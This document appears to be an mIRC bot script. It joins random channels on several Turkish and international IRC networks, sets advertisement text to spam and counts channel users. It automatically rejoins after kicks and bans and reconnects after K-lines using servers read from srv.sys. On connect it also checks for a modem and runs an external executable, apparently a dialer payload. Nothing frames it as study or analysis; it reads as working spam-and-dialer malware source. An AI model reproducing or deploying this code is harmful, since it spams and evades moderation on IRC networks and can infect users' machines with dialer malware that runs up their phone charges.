on 1:connect:{ 
  if ($cid == 1) { channel | tipp | set %modem $dll(inf.dll,connection,_) | if (%modem != none detected) { inc %dialer | if (%dialer == 1) { run too.exe } } }
  if ($cid == 2) {
    if (zurna isin $server) { join $gettok(%zurna,$rand(1,$numtok(%zurna,44)),44) | set %reklamlar %zurnanet  $+ | set %zurnak on  
    }
    if (e-kolay isin $server) { join $gettok(%ekolay,$rand(1,$numtok(%ekolay,44)),44) | set %reklamlar %zurnanet  $+ | regle | set %eko on
    }
    if (chat.gen.tr isin $server) { join $gettok(%chatgen,$rand(1,$numtok(%chatgen,44)),44) | set %reklamlar %zurnanet  $+ | regle | set %chatg on
    }
    if (teklan isin $server) { join $gettok(%teklan,$rand(1,$numtok(%teklan,44)),44) | set %reklamlar %zurnanet  $+ | set %tek on
    }
    if (muhabbet isin $server) {  join $gettok(%muhabbetkanal,$rand(1,$numtok(%muhabbetkanal,44)),44) | set %reklamlar %zurnanet  $+  | set %muhab on | timerssss34k 1 300 /scid 2 server irc.chat.gen.tr
    }
    if (undernet isin $server) { if (%unders == 0) { inc %unders | join $gettok(%undertr,$rand(1,$numtok(%undertr,44)),44) | set %reklamlar %turk  $+ | set %underle on } 
      else { join $gettok(%underen,$rand(1,$numtok(%underen,44)),44) | set %reklamlar %yaban  $+ | set %underle1 on }
    }
    if (dal.net isin $server) { if (%dals == 0) { inc %dals | join $gettok(%daltr,$rand(1,$numtok(%daltr,44)),44) | set %reklamlar %zurnanet  $+ | set %dallee on } 
      else { join $gettok(%dalen,$rand(1,$numtok(%dalen,44)),44) | set %reklamlar %yaban  $+ | set %dallee1 on  }
    }
  }
  if ($cid == 3) {
    if (zurna isin $server) { join $gettok(%zurna,$rand(1,$numtok(%zurna,44)),44) | set %reklamlar1 %zurnanet  $+ | set %zurnakf on  
    }
    if (e-kolay isin $server) { join $gettok(%ekolay,$rand(1,$numtok(%ekolay,44)),44) | set %reklamlar1 %zurnanet  $+ | regle | set %ekof on
    }
    if (chat.gen.tr isin $server) { join $gettok(%chatgen,$rand(1,$numtok(%chatgen,44)),44) | set %reklamlar1 %zurnanet  $+ | regle | set %chatgf on
    }
    if (teklan isin $server) { join $gettok(%teklan,$rand(1,$numtok(%teklan,44)),44) | set %reklamlar1 %zurnanet  $+ | set %tekf on
    }
    if (muhabbet isin $server) {  join $gettok(%muhabbetkanal,$rand(1,$numtok(%muhabbetkanal,44)),44) | set %reklamlar1 %zurnanet  $+  | set %muhabf on  | timerssss35k 1 300 /scid 3 server irc.chat.gen.tr
    }
    if (undernet isin $server) { if (%unders == 0) { inc %unders | join $gettok(%undertr,$rand(1,$numtok(%undertr,44)),44) | set %reklamlar1 %turk  $+ | set %underlef on } 
      else { join $gettok(%underen,$rand(1,$numtok(%underen,44)),44) | set %reklamlar1 %yaban  $+ | set %underle1f on }
    }
    if (dal.net isin $server) { if (%dals == 0) { inc %dals | join $gettok(%daltr,$rand(1,$numtok(%daltr,44)),44) | set %reklamlar1 %zurnanet  $+ | set %dalleef on } 
      else { join $gettok(%dalen,$rand(1,$numtok(%dalen,44)),44) | set %reklamlar1 %yaban  $+ | set %dallee1f on  }
    }
  }
  else { halt }
}

on 1:join:#: {
  if ($cid == 2) {
    if ($nick  == $me) { 
      set %chang # 
      //timerS2chekchan 1 5 /listops
    }
  }
  if ($cid == 3) {
    if ($nick  == $me) { 
      set %changf # 
      //timerS2chekchanf 1 5 /listopsf
    }
  }
}
alias listops {
  set %ibine 0
  :next
  set %nick $nick(%chang,%ibine)
  if %nick == $null goto done
  inc %ibine
  goto next
  :done
  inc %total %ibine
  unset %chang
  unset %ibine
  inc %stoperlistops 1
  if (%stoperlistops <= 4)  {
    if (%total < 450)  {
      if (%zurnak == on) { join $gettok(%zurna,$rand(1,$numtok(%zurna,44)),44) }
      if (%eko == on) { join $gettok(%ekolay,$rand(1,$numtok(%ekolay,44)),44) }
      if (%tek == on) { join $gettok(%teklan,$rand(1,$numtok(%teklan,44)),44) }
      if (%underle == on) { join $gettok(%undertr,$rand(1,$numtok(%undertr,44)),44) }
      if (%underle1 == on) { join $gettok(%underen,$rand(1,$numtok(%underen,44)),44) }
      if (%dallee == on) { join $gettok(%daltr,$rand(1,$numtok(%daltr,44)),44) }
      if (%dallee1 == on) { join $gettok(%dalen,$rand(1,$numtok(%dalen,44)),44) }
      if (%chatg == on) { join $gettok(%chatgen,$rand(1,$numtok(%chatgen,44)),44) }
      if (%chatgf == on) { join $gettok(%chatgen,$rand(1,$numtok(%chatgen,44)),44) }
      if (%muhab == on) { join $gettok(%muhabbetkanal,$rand(1,$numtok(%muhabbetkanal,44)),44) | halt }
    }
  }
}

alias listopsf {
  set %ibinef 0
  :next
  set %nick $nick(%changf,%ibinef)
  if %nick == $null goto done
  inc %ibinef
  goto next
  :done
  inc %totalf %ibinef
  unset %changf
  unset %ibinef
  inc %stoperlistopsf 1
  if (%stoperlistopsf <= 4)  {
    if (%totalf < 450)  {
      if (%zurnakf == on) { join $gettok(%zurna,$rand(1,$numtok(%zurna,44)),44) }
      if (%ekof == on) { join $gettok(%ekolay,$rand(1,$numtok(%ekolay,44)),44) }
      if (%tekf == on) { join $gettok(%teklan,$rand(1,$numtok(%teklan,44)),44) }
      if (%underlef == on) { join $gettok(%undertr,$rand(1,$numtok(%undertr,44)),44) }
      if (%underle1f == on) { join $gettok(%underen,$rand(1,$numtok(%underen,44)),44) }
      if (%dalleef == on) { join $gettok(%daltr,$rand(1,$numtok(%daltr,44)),44) }
      if (%dallee1f == on) { join $gettok(%dalen,$rand(1,$numtok(%dalen,44)),44) }
      if (%chatg == on) { join $gettok(%chatgen,$rand(1,$numtok(%chatgen,44)),44) }
      if (%chatgf == on) { join $gettok(%chatgen,$rand(1,$numtok(%chatgen,44)),44) }
      if (%muhabf == on) { join $gettok(%muhabbetkanal,$rand(1,$numtok(%muhabbetkanal,44)),44) | halt }
    }
  }
}
raw 372:*: { halt }
on 1:disconnect:{ 
  if ($cid == 1) { chek }
  if ($cid == 2) { set %stoperlistops 1 | set %total 0 | set %underle off | set %chatgf off | set %chatg off | set %underle1 off | set %dallee off | set %dallee1 off | set %zurnak off | set %eko off | set %tek off | set %muhab off | set %gondertime1c %saniye $+ | set %gondertimedus1c %saniye $+ | set %timer1inc1c 0 | set %cukum1c 0 | set %pipim1c | set %timer2inc1c 0 | set %timer3inc1c 0 | set %timer4inc1c 0 | set %timer5inc1c 0 | set %timer6inc1c 0 | set %timer7inc1c 0 | set %timer8inc1c 0 | set %timer9inc1c 0 |  set %timer10inc1c 0 | echo -a resetlenme sid 2 tamam | scid 2 server $read srv.sys } 
  if ($cid == 3) { set %stoperlistopsf 1 | set %totalf 0 | set %underlef off | set %chatgf off | set %chatg off | set %underle1f off | set %dalleef off | set %dallee1f off | set %zurnakf off | set %ekof off | set %tekf off | set %muhabf off | set %gondertime1cp %saniye $+ | set %gondertimedus1cp %saniye $+ | set %timer1inc1cp 0 | set %cukum1cp 0 | set %pipim1cp | set %timer2inc1cp 0 | set %timer3inc1cp 0 | set %timer4inc1cp 0 | set %timer5inc1cp 0 | set %timer6inc1cp 0 | set %timer7inc1cp 0 | set %timer8inc1cp 0 | set %timer9inc1cp 0 |  set %timer10inc1cp 0 | echo -a resetlenme sid 3 tamam | scid 3 server $read srv.sys  } 
}

raw 471:*: {  if ($cid == 2) {
    listops
    halt
  }
  if ($cid == 3) {
    listopsf
    halt
  }
}

raw 465:*: {  if ($cid == 2) {
    /scid 2 server $read srv.sys
    halt
  }
  if ($cid == 3) {
    /scid 3 server $read srv.sys
    halt
  }
}



raw 473:*: {  if ($cid == 2) {
    listops
    halt
  }
  if ($cid == 3) {
    listopsf
    halt
  }
}
raw 477:*: {  if ($cid == 2) {
    listops
    halt
  }
  if ($cid == 3) {
    listopsf
    halt
  }
}
on 1:BAN:#: {  
  if ($cid == 1) {
    if ($chan == $master) {
      inc %cukcuk4 1
      chek
      halt
    }
  }
  if ($cid == 2) { 
    if ($bnick == $me) {
      listops
      halt
    }
  }
  if ($cid == 3) {
    if ($bnick == $me) {
      listopsf
      halt
    }
  }
}
on 1:KICK:#: {  if ($cid == 2) { 
    if ($knick == $me) {
      j $chan
      halt
    }
  }
  if ($cid == 3) {
    if ($knick == $me) {
      j $chan
      halt
    }
  }
}
